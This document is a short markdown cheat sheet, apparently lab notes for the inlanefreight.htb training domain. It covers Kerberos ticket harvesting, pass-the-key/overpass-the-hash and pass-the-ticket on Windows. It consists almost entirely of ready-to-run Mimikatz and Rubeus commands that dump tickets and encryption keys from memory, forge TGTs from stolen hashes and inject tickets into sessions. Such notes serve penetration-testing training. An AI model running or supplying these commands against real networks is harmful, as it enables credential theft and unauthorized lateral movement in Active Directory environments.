# Harvest kerberos ticket
#### Mimikatz
```
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```
#### Rubeus
```
.\rubeus.exe dump /nowrap
```

---
#### Request a kerberos ticket
```
./rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:hash /ptt
```
#### Load `.kirbi` ticket in memory
#loadkirbifileinmemory #kirbifileinmemory #kirbifilememory
```
./rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

---
# Pass-the-key 
The traditional `Pass the Hash` (`PtH`) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (`rc4_hmac, aes256_cts_hmac_sha1`, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`).

## Method 1:
#### Mimikatz - get the hash
>mimikatz `requires` the admin privileges to perform the pass-the-key attack
```
.\mimikatz.exe "sekurlsa::ekeys" exit
```
#### Mimikatz - perform the attack
>It will create a new cmd windows that you can use to request access to any service.
```
.\mimikatz.exe "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:hash" exit
```

## Method 2: 
#### Rubeus - request kirbi ticket
>Rubeus `does not` requires the admin privileges to perform the pass-the-key attack
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:Hash /nowrap
```
---
# Base64
#### Convert .kirbi to base64 format
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
#### Rubeus: Load base64 .kirbi file in memory
```
./rubeus.exe ptt /ticket:<base64_kirbi_file>
```
#### Mimikatz: Load .kirbi file in memory
```
./mimikatz.exe "kerberos::ptt 'C:\Users\kirbi_file'" exit
```

---
# Powershell remoting with pass-the-ticket
>This command is equivalent of `runas /netonly`
```
./rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```